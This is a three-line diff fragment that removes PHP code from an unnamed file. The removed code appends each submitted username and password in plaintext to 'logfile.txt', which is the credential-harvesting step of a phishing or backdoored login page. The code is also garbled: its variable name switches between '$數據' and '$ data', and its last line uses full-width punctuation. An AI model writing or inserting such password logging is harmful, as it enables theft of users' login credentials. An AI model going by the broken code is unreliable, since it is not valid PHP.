@@ -1,3 +1,0 @@
-$數據= fopen ( "logfile.txt" , "a+" );
-fwrite ( $ data , "用戶名：$account\n密碼：$passwd\n" );
-fclose（ $數據）；
